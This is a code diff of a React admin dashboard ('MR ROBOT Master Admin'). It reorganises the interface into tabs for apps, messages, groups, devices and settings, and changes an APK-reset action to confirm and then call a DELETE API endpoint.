-    setRenewConfirmApp(app);
+    if (!confirm(`Reset APK selection for "${app.name}"?`)) return;
+    setResetApkId(app.appId);
+    try {
+      const r = await apiFetch(`/api/master/token-app/${encodeURIComponent(app.appId)}`, { method: "DELETE", headers: { "x-master-pin": masterPin } });
+      const j = await r.json() as { ok?: boolean; error?: string; deleted?: number };
+      if (r.ok) alert(`✅ Reset done! ${j.deleted ?? 0} mapping(s) cleared.`);
+      else alert(`❌ Error: ${j.error ?? "Unknown error"}`);
+    } catch { alert("❌ Network error"); } finally { setResetApkId(null); }
   }
 
-    function copyUrl(app: App) {
+  function copyUrl(app: App) {
     const url = `${window.location.origin}/preview/dashboard/WebDashboard?appId=${app.appId}`;
     copyToClipboard(url).then(() => {
       setCopyMsg(p => ({ ...p, [app.appId]: "Copied!" }));
@@ -795,235 +1371,176 @@ Sabhi users ka selected APK clear ho jaayega — woh fir se select kar sakenge.`
     a.appId.toLowerCase().includes(search.trim().toLowerCase()) || a.name.toLowerCase().includes(search.trim().toLowerCase())
   );
   const activeCount = appList.filter(a => a.status === "active").length;
-  const disabledCount = appList.length - activeCount;
   const pingBusy = pingState === "running" || pingState === "loading";
+
+  const TABS: { id: Tab; label: string; icon: React.ReactNode }[] = [
+    { id: "apps", label: "Apps", icon: <Ic.Layers /> },
+    { id: "messages", label: "Messages", icon: <Ic.MessageSquare /> },
+    { id: "groups", label: "Groups", icon: <Ic.Database /> },
+    { id: "devices", label: "Devices", icon: <Ic.Smartphone /> },
+    { id: "settings", label: "Settings", icon: <Ic.Settings /> },
+  ];
 
   return (
     <div style={{ minHeight: "100vh", background: T.bg, fontFamily: "'Inter', system-ui, sans-serif", color: T.text }}>
-
       <style>{`
-              @keyframes spin { to { transform: rotate(360deg) } }
-              @keyframes ma-pulse { 0%,100%{opacity:1} 50%{opacity:0.55} }
-              @keyframes ma-fabglow { 0%,100%{box-shadow:0 4px 20px rgba(99,102,241,0.55)} 50%{box-shadow:0 4px 32px rgba(139,92,246,0.75)} }
-              * { box-sizing:border-box; }
-              .ma-card { transition:transform 0.18s, box-shadow 0.18s !important; }
-              .ma-card:active { transform:scale(0.985); }
-              .ma-btn { -webkit-tap-highlight-color:transparent; }
-              .ma-btn:active { opacity:0.7 !important; transform:scale(0.92); }
-              .ma-bottom-nav {
-                display:none; position:fixed; bottom:0; left:0; right:0;
-                background:rgba(7,9,20,0.98); border-top:1px solid rgba(99,102,241,0.2);
-                backdrop-filter:blur(28px); -webkit-backdrop-filter:blur(28px);
-                padding:8px 12px calc(10px + env(safe-area-inset-bottom)); z-index:200;
-                justify-content:space-around; align-items:center;
-                box-shadow:0 -6px 40px rgba(0,0,0,0.75);
-              }
-              .ma-bnav-item {
-                display:flex; flex-direction:column; align-items:center; gap:3px;
-                cursor:pointer; color:rgba(100,115,160,0.85); transition:color 0.15s;
-                background:none; border:none; outline:none; padding:6px 18px;
-                font-family:inherit; -webkit-tap-highlight-color:transparent; flex:1;
-              }
-              .ma-bnav-item:active { color:#818cf8; transform:scale(0.88); }
-              .ma-bnav-lbl { font-size:10px; font-weight:700; letter-spacing:0.4px; text-transform:uppercase; margin-top:1px; }
-              .ma-fab {
-                width:54px; height:54px; border-radius:17px; border:none;
-                background:linear-gradient(135deg,#5254d4,#7c3aed);
-                box-shadow:0 4px 20px rgba(99,102,241,0.55), 0 0 0 1px rgba(255,255,255,0.07) inset;
-                display:flex; align-items:center; justify-content:center;
-                color:#fff; cursor:pointer; transition:all 0.15s; outline:none;
-                margin-top:-20px; flex-shrink:0;
-                animation:ma-fabglow 2.8s ease-in-out infinite;
-              }
-              .ma-fab:active { transform:scale(0.88) !important; }
-              .ma-fab-wrap { display:flex; flex-direction:column; align-items:center; gap:3px; flex:1; }
-              @media (max-width:640px) {
-                .ma-bottom-nav { display:flex; }
-                .ma-hide-mob { display:none !important; }
-                .ma-main { padding-bottom:88px !important; }
-              }
-            `}</style>
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes ma-pulse{0%,100%{opacity:1}50%{opacity:0.55}}
+        *{box-sizing:border-box}
+        .ma-tab-btn{cursor:pointer;background:none;border:none;font-family:inherit;-webkit-tap-highlight-color:transparent;}
+        .ma-tab-btn:active{opacity:0.7;}
+        .ma-card:active{transform:scale(0.985);}
+        .ma-bottom-nav{display:none;position:fixed;bottom:0;left:0;right:0;background:rgba(7,9,20,0.98);border-top:1px solid rgba(99,102,241,0.2);backdrop-filter:blur(28px);-webkit-backdrop-filter:blur(28px);padding:6px 4px calc(8px + env(safe-area-inset-bottom));z-index:200;justify-content:space-around;align-items:center;box-shadow:0 -6px 40px rgba(0,0,0,0.75);}
+        .ma-bnav-item{display:flex;flex-direction:column;align-items:center;gap:2px;cursor:pointer;color:rgba(100,115,160,0.8);transition:color 0.15s;background:none;border:none;outline:none;padding:4px 6px;font-family:inherit;-webkit-tap-highlight-color:transparent;flex:1;}
+        .ma-bnav-item:active{transform:scale(0.88);}
+        .ma-bnav-lbl{font-size:9px;font-weight:700;letter-spacing:0.4px;text-transform:uppercase;}
+        .ma-bnav-active{color:#818cf8;}
+        .ma-fab{width:46px;height:46px;border-radius:14px;border:none;background:linear-gradient(135deg,#5254d4,#7c3aed);display:flex;align-items:center;justify-content:center;color:#fff;cursor:pointer;margin-top:-16px;flex-shrink:0;box-shadow:0 4px 20px rgba(99,102,241,0.55);}
+        .ma-fab-wrap{display:flex;flex-direction:column;align-items:center;gap:2px;flex:1;}
+        @media(max-width:640px){.ma-bottom-nav{display:flex;}.ma-main{padding-bottom:80px!important;}.ma-hide-mob{display:none!important;}}
+      `}</style>
 
-      {/* ── Header ── */}
-        <div style={{ background:"rgba(7,9,20,0.98)", borderBottom:"1px solid rgba(99,102,241,0.18)", padding:"0 16px", position:"sticky", top:0, zIndex:50, backdropFilter:"blur(24px)", WebkitBackdropFilter:"blur(24px)", boxShadow:"0 4px 24px rgba(0,0,0,0.6)" }}>
-          <div style={{ position:"absolute", top:0, left:0, right:0, height:2, background:"linear-gradient(90deg,#6366f1,#8b5cf6,#ec4899,#6366f1)", backgroundSize:"200% 100%", animation:"none" }} />
-          <div style={{ maxWidth:960, margin:"0 auto", display:"flex", alignItems:"center", justifyContent:"space-between", height:56, gap:8 }}>
-            <div style={{ display:"flex", alignItems:"center", gap:10 }}>
-              <div style={{ width:34, height:34, borderRadius:11, background:"linear-gradient(145deg,#4f52d4,#7c3aed)", display:"flex", alignItems:"center", justifyContent:"center", color:"#fff", flexShrink:0, boxShadow:"0 4px 14px rgba(99,102,241,0.5)" }}>
-                <Ic.CPU />
-              </div>
-              <div style={{ lineHeight:1.15 }}>
-                <div style={{ fontSize:14, fontWeight:900, color:"#f1f1f5", letterSpacing:-0.4 }}>MR ROBOT</div>
-                <div style={{ fontSize:9, color:"#818cf8", fontWeight:700, letterSpacing:1.8, textTransform:"uppercase" }}>Master Admin</div>
-              </div>
-            </div>
-            <div style={{ display:"flex", gap:7, alignItems:"center" }}>
-              <button onClick={() => void openAllDevices()} title="All Devices" className="ma-btn" style={{ width:38, height:38, borderRadius:12, display:"flex", alignItems:"center", justifyContent:"center", cursor:"pointer", transition:"all 0.15s", outline:"none", border:"1px solid rgba(99,102,241,0.3)", background:"rgba(99,102,241,0.14)", color:"#818cf8" }}>
-                <Ic.Smartphone />
-              </button>
-              <button onClick={() => setShowChangePin(true)} title="Change PIN" className="ma-btn" style={{ width:38, height:38, borderRadius:12, display:"flex", alignItems:"center", justifyContent:"center", cursor:"pointer", transition:"all 0.15s", outline:"none", border:"1px solid rgba(255,255,255,0.08)", background:"rgba(255,255,255,0.04)", color:"#94a3b8" }}>
-                <Ic.Key />
-              </button>
-              <button onClick={onLogout} title="Logout" className="ma-btn" style={{ width:38, height:38, borderRadius:12, display:"flex", alignItems:"center", justifyContent:"center", cursor:"pointer", transition:"all 0.15s", outline:"none", border:"1px solid rgba(239,68,68,0.28)", background:"rgba(239,68,68,0.1)", color:"#f87171" }}>
-                <Ic.LogOut />
-              </button>
-            </div>
-          </div>
-        </div>
-      <div className="ma-main" style={{ maxWidth:960,margin:"0 auto",padding:"20px 14px" }}>
-
-        {/* Stats */}
-        <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10, marginBottom: 20 }}>
-          {[
-            { label: "Total Apps", val: appList.length, color: T.accent, Icon: Ic.Layers },
-            { label: "Active", val: activeCount, color: T.green, Icon: Ic.CheckCircle },
-            { label: "Disabled", val: disabledCount, color: T.red, Icon: Ic.XCircle },
-          ].map(({ label, val, color, Icon }) => (
-            <div key={label} style={{ background: T.card, borderRadius: 13, padding: "15px 18px", border: `1px solid ${T.borderLight}`, position: "relative", overflow: "hidden" }}>
-              <div style={{ position: "absolute", top: -10, right: -10, width: 60, height: 60, borderRadius: "50%", background: color + "12", pointerEvents: "none" }} />
-              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
-                <span style={{ color, opacity: 0.9 }}><Icon /></span>
-                <span style={{ fontSize: 10, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.5 }}>{label}</span>
-              </div>
-              <div style={{ fontSize: 32, fontWeight: 900, color, lineHeight: 1 }}>{val}</div>
-            </div>
-          ))}
-        </div>
-
-        {/* ── FCM Check Online Section ── */}
-        <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, overflow: "hidden", marginBottom: 20 }}>
-          <div style={{ padding: "12px 18px", borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-              <div style={{ color: T.accentLight }}><Ic.Wifi /></div>
-              <span style={{ fontWeight: 800, fontSize: 14, color: T.text }}>Check Online</span>
-            </div>
-            <span style={{ background: T.accentGlow, color: T.accentLight, borderRadius: 99, padding: "2px 10px", fontSize: 10, fontWeight: 800, border: `1px solid ${T.accent}44` }}>ALL DEVICES</span>
-          </div>
-          <div style={{ padding: "16px 18px", display: "flex", flexDirection: "column", gap: 12 }}>
-            <div style={{ fontSize: 12, color: T.muted, lineHeight: 1.6 }}>
-              Sends a <b style={{ color: T.mutedLight }}>check_online</b> ping to all <b style={{ color: T.mutedLight }}>FCM-enabled devices</b> across all App IDs — in batches of 100. No effect on sub-admin.
-            </div>
-
-            {/* Progress bar */}
-            {(pingState === "running" || pingState === "loading") && (
-              <div>
-                <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: T.muted, marginBottom: 5 }}>
-                  <span>{pingState === "loading" ? "Fetching devices…" : "Sending pings…"}</span>
-                  {pingState === "running" && <span style={{ color: T.accentLight, fontWeight: 700 }}>{pingDone} / {pingTotal}</span>}
-                </div>
-                <div style={{ height: 5, background: T.border, borderRadius: 3, overflow: "hidden" }}>
-                  <div style={{ height: "100%", background: `linear-gradient(90deg, ${T.accent}, #8b5cf6)`, width: pingState === "loading" ? "15%" : `${pingTotal > 0 ? Math.round((pingDone / pingTotal) * 100) : 0}%`, transition: "width 0.3s" }} />
-                </div>
-              </div>
-            )}
-
-            {/* Result */}
-            {pingState === "done" && pingResult && (
-              <div style={{ background: T.green + "18", border: `1px solid ${T.green}44`, borderRadius: 10, padding: "10px 14px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-                <span style={{ color: T.green, fontWeight: 700, fontSize: 13 }}>Ping complete!</span>
-                <span style={{ fontSize: 12, color: T.muted }}>
-                  <span style={{ color: T.green, fontWeight: 700 }}>{pingResult.ok}</span> sent
-                  {pingResult.fail > 0 && <> · <span style={{ color: T.red, fontWeight: 700 }}>{pingResult.fail}</span> failed</>}
-                </span>
-              </div>
-            )}
-            {pingState === "err" && (
-              <div style={{ background: T.red + "15", border: `1px solid ${T.red}33`, borderRadius: 10, padding: "10px 14px", display: "flex", alignItems: "center", gap: 8, color: T.red, fontSize: 13, fontWeight: 700 }}>
-                <Ic.Alert /> Fetch failed. Please retry.
-              </div>
-            )}
-
-            <button
-              onClick={() => void handlePingAll()}
-              disabled={pingBusy}
-              style={{
-                padding: "12px 0", borderRadius: 10, border: "none",
-                background: pingState === "done" ? T.green : pingBusy ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`,
-                color: pingState === "done" ? "#fff" : pingBusy ? T.accentLight : "#fff",
-                fontWeight: 800, fontSize: 13, cursor: pingBusy ? "not-allowed" : "pointer",
-                boxShadow: !pingBusy && pingState !== "done" ? "0 4px 14px rgba(99,102,241,0.35)" : "none",
-                transition: "all 0.15s",
-                display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
-              }}>
-              {pingState === "loading" ? (<><div style={{ display: "inline-block", width: 13, height: 13, border: "2px solid currentColor", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} /> Fetching…</>) :
-               pingState === "running" ? (<><div style={{ display: "inline-block", width: 13, height: 13, border: "2px solid currentColor", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} /> {pingDone}/{pingTotal}…</>) :
-               pingState === "done" ? (<><Ic.Check /> Done</>) :
-               pingState === "err" ? "Error — Retry" :
-               (<><Ic.Wifi /> Ping All Devices</>)}
-            </button>
-          </div>
-        </div>
-
-          {/* Apps header */}
-          <div style={{ display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:12,gap:12,flexWrap:"wrap" }}>
+      {/* Header */}
+      <div style={{ background: "rgba(7,9,20,0.98)", borderBottom: "1px solid rgba(99,102,241,0.18)", padding: "0 16px", position: "sticky", top: 0, zIndex: 50, backdropFilter: "blur(24px)", WebkitBackdropFilter: "blur(24px)" }}>
+        <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 2, background: "linear-gradient(90deg,#6366f1,#8b5cf6,#ec4899,#6366f1)" }} />
+        <div style={{ maxWidth: 960, margin: "0 auto", display: "flex", alignItems: "center", justifyContent: "space-between", height: 54, gap: 8 }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+            <div style={{ width: 34, height: 34, borderRadius: 11, background: "linear-gradient(145deg,#4f52d4,#7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", boxShadow: "0 4px 14px rgba(99,102,241,0.5)" }}><Ic.CPU /></div>
             <div>
-              <div style={{ fontSize:14,fontWeight:800,color:T.text }}>Sub-Admin Apps</div>
-              <div style={{ fontSize:11,color:T.muted,marginTop:2 }}>Sorted by newest first</div>
+              <div style={{ fontSize: 14, fontWeight: 900, color: "#f1f1f5", letterSpacing: -0.4 }}>MR ROBOT</div>
+              <div style={{ fontSize: 9, color: "#818cf8", fontWeight: 700, letterSpacing: 1.8, textTransform: "uppercase" }}>Master Admin</div>
             </div>
-            <button onClick={() => setShowCreate(true)} className="ma-hide-mob" style={{ padding:"8px 16px",borderRadius:10,background:"linear-gradient(135deg,#5254d4,#7c3aed)",border:"none",color:"#fff",fontWeight:800,fontSize:12,cursor:"pointer",boxShadow:"0 4px 14px rgba(99,102,241,0.38)",display:"flex",alignItems:"center",gap:6 }}>
-              <Ic.Plus /> New App
-            </button>
           </div>
-        {/* Search */}
-        <div style={{ marginBottom: 14, position: "relative" }}>
-          <span style={{ position: "absolute", left: 13, top: "50%", transform: "translateY(-50%)", color: T.muted, pointerEvents: "none", display: "flex" }}><Ic.Search /></span>
-          <input type="text" placeholder="Search by App ID or name…" value={search} onChange={e => setSearch(e.target.value)}
-            style={{ width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 40px", borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none", transition: "border-color 0.15s" }}
-            onFocus={e => e.target.style.borderColor = T.accent + "60"} onBlur={e => e.target.style.borderColor = T.borderLight} />
-          {search && (<button onClick={() => setSearch("")} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 22, height: 22, borderRadius: 6, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>)}
-        </div>
-
-        {/* App List */}
-        {loading ? (
-          <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 14 }}>
-            <div style={{ color: T.accent }}><Ic.Loader /></div>
-            <div style={{ fontSize: 13 }}>Loading apps…</div>
-          </div>
-        ) : filteredApps.length === 0 ? (
-          <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
-            <div style={{ color: T.border }}><Ic.Inbox /></div>
-            <div style={{ fontSize: 13 }}>{search ? `No apps found for "${search}".` : 'No apps yet. Click "New App" to create one.'}</div>
-          </div>
-        ) : (
-          <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
-            {filteredApps.map(app => (
-              <AppCard key={app.appId} app={app} onEdit={setEditApp} onDelete={deleteApp} onToggle={toggleStatus} onLogoutAll={logoutAll} onCopyUrl={copyUrl} onResetApk={resetApk} onRenew={openRenew} copyMsg={copyMsg} deletingId={deletingId} togglingId={togglingId} logoutAllId={logoutAllId} resetApkId={resetApkId} renewId={renewId} />
+          {/* Desktop tabs */}
+          <div className="ma-hide-mob" style={{ display: "flex", gap: 2 }}>
+            {TABS.map(t => (
+              <button key={t.id} className="ma-tab-btn" onClick={() => setTab(t.id)} style={{ padding: "6px 14px", borderRadius: 9, display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 700, color: tab === t.id ? T.accentLight : T.muted, background: tab === t.id ? T.accentGlow : "transparent", border: `1px solid ${tab === t.id ? T.accent + "44" : "transparent"}`, transition: "all 0.15s" }}>
+                {t.icon}<span>{t.label}</span>
+              </button>
             ))}
           </div>
+          <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
+            <button onClick={() => setShowChangePin(true)} title="Change PIN" style={{ width: 36, height: 36, borderRadius: 11, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(255,255,255,0.08)", background: "rgba(255,255,255,0.04)", color: "#94a3b8" }}><Ic.Key /></button>
+            <button onClick={onLogout} title="Logout" style={{ width: 36, height: 36, borderRadius: 11, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", border: "1px solid rgba(239,68,68,0.28)", background: "rgba(239,68,68,0.1)", color: "#f87171" }}><Ic.LogOut /></button>
+          </div>
+        </div>
+      </div>
+
+      {/* Main content */}
+      <div className="ma-main" style={{ maxWidth: 960, margin: "0 auto", padding: "16px 14px" }}>
+
+        {/* APPS TAB */}
+        {tab === "apps" && (
+          <>
+            {/* Stats */}
+            <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10, marginBottom: 16 }}>
+              {[
+                { label: "Total Apps", val: appList.length, color: T.accent, Icon: Ic.Layers },
+                { label: "Active", val: activeCount, color: T.green, Icon: Ic.CheckCircle },
+                { label: "Disabled", val: appList.length - activeCount, color: T.red, Icon: Ic.XCircle },
+              ].map(({ label, val, color, Icon }) => (
+                <div key={label} style={{ background: T.card, borderRadius: 13, padding: "14px 16px", border: `1px solid ${T.borderLight}`, position: "relative", overflow: "hidden" }}>
+                  <div style={{ position: "absolute", top: -10, right: -10, width: 60, height: 60, borderRadius: "50%", background: color + "12", pointerEvents: "none" }} />
+                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
+                    <span style={{ color, opacity: 0.9 }}><Icon /></span>
+                    <span style={{ fontSize: 10, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.5 }}>{label}</span>
+                  </div>
+                  <div style={{ fontSize: 30, fontWeight: 900, color, lineHeight: 1 }}>{val}</div>
+                </div>
+              ))}
+            </div>
+
+            {/* Ping All */}
+            <div style={{ background: T.card, borderRadius: 13, border: `1px solid ${T.borderLight}`, overflow: "hidden", marginBottom: 16 }}>
+              <div style={{ padding: "11px 16px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                <div style={{ display: "flex", alignItems: "center", gap: 8 }}><div style={{ color: T.accentLight }}><Ic.Wifi /></div><span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Check Online — All Devices</span></div>
+              </div>
+              <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
+                <div style={{ fontSize: 12, color: T.muted }}>Sends <b style={{ color: T.mutedLight }}>online_check</b> ping to all <b style={{ color: T.mutedLight }}>FCM-enabled</b> devices in batches of 100.</div>
+                {(pingState === "running" || pingState === "loading") && (
+                  <div>
+                    <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: T.muted, marginBottom: 4 }}>
+                      <span>{pingState === "loading" ? "Fetching devices…" : "Sending pings…"}</span>
+                      {pingState === "running" && <span style={{ color: T.accentLight, fontWeight: 700 }}>{pingDone}/{pingTotal}</span>}
+                    </div>
+                    <div style={{ height: 4, background: T.border, borderRadius: 3, overflow: "hidden" }}>
+                      <div style={{ height: "100%", background: `linear-gradient(90deg,${T.accent},#8b5cf6)`, width: pingState === "loading" ? "12%" : `${pingTotal > 0 ? Math.round((pingDone / pingTotal) * 100) : 0}%`, transition: "width 0.3s" }} />
+                    </div>
+                  </div>
+                )}
+                {pingState === "done" && pingResult && (
+                  <div style={{ background: T.green + "18", border: `1px solid ${T.green}44`, borderRadius: 9, padding: "9px 14px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                    <span style={{ color: T.green, fontWeight: 700, fontSize: 13 }}>Ping complete!</span>
+                    <span style={{ fontSize: 12, color: T.muted }}><span style={{ color: T.green, fontWeight: 700 }}>{pingResult.ok}</span> sent{pingResult.fail > 0 && <> · <span style={{ color: T.red, fontWeight: 700 }}>{pingResult.fail}</span> failed</>}</span>
+                  </div>
+                )}
+                {pingState === "err" && <div style={{ background: T.red + "15", borderRadius: 9, padding: "9px 14px", color: T.red, fontSize: 12, display: "flex", alignItems: "center", gap: 8 }}><Ic.Alert /> Fetch failed. Retry.</div>}
+                <button onClick={() => void handlePingAll()} disabled={pingBusy} style={{ padding: "11px 0", borderRadius: 9, border: "none", background: pingState === "done" ? T.green : pingBusy ? T.accentGlow : `linear-gradient(135deg,${T.accent},#8b5cf6)`, color: pingState === "done" ? "#fff" : pingBusy ? T.accentLight : "#fff", fontWeight: 800, fontSize: 13, cursor: pingBusy ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+                  {pingState === "loading" ? <><Spinner /> Fetching…</> : pingState === "running" ? <><Spinner /> {pingDone}/{pingTotal}…</> : pingState === "done" ? <><Ic.Check /> Done</> : pingState === "err" ? "Error — Retry" : <><Ic.Wifi /> Ping All Devices</>}
+                </button>
+              </div>
+            </div>
+
+            {/* Apps header + search */}
+            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10, gap: 12, flexWrap: "wrap" }}>
+              <div><div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>Sub-Admin Apps</div><div style={{ fontSize: 11, color: T.muted, marginTop: 1 }}>Sorted by newest first</div></div>
+              <button onClick={() => setShowCreate(true)} className="ma-hide-mob" style={{ padding: "8px 16px", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 800, fontSize: 12, cursor: "pointer", display: "flex", alignItems: "center", gap: 6 }}><Ic.Plus /> New App</button>
+            </div>
+            <div style={{ marginBottom: 12, position: "relative" }}>
+              <span style={{ position: "absolute", left: 13, top: "50%", transform: "translateY(-50%)", color: T.muted, pointerEvents: "none", display: "flex" }}><Ic.Search /></span>
+              <input type="text" placeholder="Search by App ID or name…" value={search} onChange={e => setSearch(e.target.value)} style={{ width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 40px", borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
+              {search && <button onClick={() => setSearch("")} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 22, height: 22, borderRadius: 6, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
+            </div>
+            {appsLoading ? (
+              <div style={{ textAlign: "center", padding: 60, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 14 }}><Ic.Loader /><div>Loading apps…</div></div>
+            ) : filteredApps.length === 0 ? (
+              <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
+                <Ic.Inbox /><div>{search ? `No apps for "${search}".` : 'No apps yet. Click "New App" to create.'}</div>
+              </div>
+            ) : (
+              <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
+                {filteredApps.map(app => (
+                  <AppCard key={app.appId} app={app} onEdit={setEditApp} onDelete={deleteApp} onToggle={toggleStatus} onLogoutAll={logoutAll} onCopyUrl={copyUrl} onResetApk={resetApk} onRenew={a => setRenewConfirmApp(a)} copyMsg={copyMsg} deletingId={deletingId} togglingId={togglingId} logoutAllId={logoutAllId} resetApkId={resetApkId} renewId={renewId} />
+                ))}
+              </div>
+            )}
+          </>
         )}
+
+        {tab === "messages" && <MessagesTab apps={appList} masterPin={masterPin} />}
+        {tab === "groups" && <GroupsTab apps={appList} masterPin={masterPin} />}
+        {tab === "devices" && <DevicesTab apps={appList} masterPin={masterPin} />}
+        {tab === "settings" && <SettingsTab apps={appList} masterPin={masterPin} />}
       </div>
 
       {/* Modals */}
-      {showAllDevices && (
-        <AllDevicesModal devices={allDevicesList} loading={allDevLoading} search={allDevSearch}
-          onSearchChange={setAllDevSearch} onClose={() => setShowAllDevices(false)}
-          onRefresh={() => void openAllDevices(true)} />
-      )}
-      {showCreate && (<CreateAppModal masterPin={masterPin} onClose={() => setShowCreate(false)} onCreated={a => { setAppList(prev => [a, ...prev]); setShowCreate(false); }} />)}
-      {showChangePin && (<ChangePinModal masterPin={masterPin} onClose={() => setShowChangePin(false)} onChanged={p => { onPinChanged(p); setShowChangePin(false); }} />)}
-      {editApp && (<EditAppModal app={editApp} masterPin={masterPin} onClose={() => setEditApp(null)} onUpdated={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? a : x)); setEditApp(null); }} />)}
-      {renewConfirmApp && (<RenewModal app={renewConfirmApp} masterPin={masterPin} onClose={() => setRenewConfirmApp(null)} onRenewed={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? { ...x, createdAt: a.createdAt, status: a.status } : x)); setRenewConfirmApp(null); }} />)}
+      {showCreate && <CreateAppModal masterPin={masterPin} onClose={() => setShowCreate(false)} onCreated={a => { setAppList(prev => [a, ...prev]); setShowCreate(false); }} />}
+      {showChangePin && <ChangePinModal masterPin={masterPin} onClose={() => setShowChangePin(false)} onChanged={p => { onPinChanged(p); setShowChangePin(false); }} />}
+      {editApp && <EditAppModal app={editApp} masterPin={masterPin} onClose={() => setEditApp(null)} onUpdated={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? a : x)); setEditApp(null); }} />}
+      {renewConfirmApp && <RenewModal app={renewConfirmApp} masterPin={masterPin} onClose={() => setRenewConfirmApp(null)} onRenewed={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? { ...x, createdAt: a.createdAt, status: a.status } : x)); setRenewConfirmApp(null); }} />}
 
-      {/* ── Bottom Nav (mobile only) ── */}
-          <div className="ma-bottom-nav">
-            <button className="ma-bnav-item ma-btn" onClick={() => void openAllDevices()} title="Devices">
-              <Ic.Smartphone />
-              <span className="ma-bnav-lbl">Devices</span>
-            </button>
-            <div className="ma-fab-wrap">
-              <button className="ma-fab" onClick={() => setShowCreate(true)} title="New App"><Ic.Plus /></button>
-              <span className="ma-bnav-lbl" style={{ color:"#818cf8" }}>New App</span>
-            </div>
-            <button className="ma-bnav-item ma-btn" onClick={onLogout} title="Logout">
-              <Ic.LogOut />
-              <span className="ma-bnav-lbl">Logout</span>
-            </button>
-          </div>
+      {/* Mobile Bottom Nav */}
+      <div className="ma-bottom-nav">
+        {TABS.slice(0, 2).map(t => (
+          <button key={t.id} className={`ma-bnav-item ma-tab-btn ${tab === t.id ? "ma-bnav-active" : ""}`} onClick={() => setTab(t.id)}>
+            {t.icon}<span className="ma-bnav-lbl">{t.label}</span>
+          </button>
+        ))}
+        <div className="ma-fab-wrap">
+          <button className="ma-fab" onClick={() => setShowCreate(true)} title="New App"><Ic.Plus /></button>
+          <span className="ma-bnav-lbl" style={{ color: "#818cf8" }}>New</span>
+        </div>
+        {TABS.slice(2).map(t => (
+          <button key={t.id} className={`ma-bnav-item ma-tab-btn ${tab === t.id ? "ma-bnav-active" : ""}`} onClick={() => setTab(t.id)}>
+            {t.icon}<span className="ma-bnav-lbl">{t.label}</span>
+          </button>
+        ))}
+      </div>
     </div>
   );
 }
 
-/* ─────────── Root Export ─────────── */
+/* ── Root Export ── */
 export default function MainAdminPanel() {
   const [masterPin, setMasterPin] = useState<string | null>(() => sessionStorage.getItem("mrrobot_master_auth") ?? null);
   function handleAuth(pin: string) { sessionStorage.setItem("mrrobot_master_auth", pin); setMasterPin(pin); }
